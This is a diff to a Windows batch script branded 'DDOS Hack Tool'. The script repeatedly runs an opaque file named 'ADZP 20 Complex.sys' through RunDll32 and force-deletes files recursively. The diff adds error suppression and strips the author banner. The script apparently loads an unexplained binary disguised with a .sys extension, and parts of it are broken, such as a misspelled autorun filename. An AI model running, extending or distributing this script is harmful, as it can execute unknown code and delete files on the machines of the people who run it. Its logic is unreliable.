@@ -1,13 +1,7 @@
-:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::
-:: ----------------------------------------------------------------------------------- DDOS Hack Tool --------------------------------------------------------------------------- ::
-:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::
-:: ------------------------------------------------------------------------------- Copyright: Dharkon SK ------------------------------------------------------------------------ ::
-:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::
-
 @echo off
 title DDOS Hack Tool
 color a
-cd SystemDDOS >nul
+cd SystemDDOS >nul 2>nul
 cls
 if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc0) >nul
 goto Inicio
@@ -24,6 +18,7 @@ exit
 
 :Error0x0cc20
 cls
+timeout /t 2 >nul
 color f
 echo.
 echo.
@@ -296,7 +291,7 @@ cls
 if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
 if exist %name%.bat (del /f /q /s %name%.bat & RunDll32 "ADZP 20 Complex.sys") else (echo.)
 if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
-if exist DDOS-Autorun.inf (del /f /q /s DDOS-Aurorun.inf & RunDll32 "ADZP 20 Complex.sys") else (echo.)
+if exist DDOS-Autorun.inf (del /f /q /s DDOS-Aurorun.inf & RunDll32 "ADZP 20 Complex.sys")
 if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
 echo off>>"%name%".bat
 if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
